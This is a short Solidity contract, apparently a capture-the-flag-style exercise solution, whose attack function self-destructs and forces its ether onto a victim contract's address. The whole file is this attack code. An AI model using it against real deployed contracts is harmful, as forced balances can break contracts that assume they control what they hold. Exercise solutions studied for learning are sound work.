// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract AttackForce {
    function attack(address _victim) external payable {
        selfdestruct(payable(address(_victim)));
    }
}
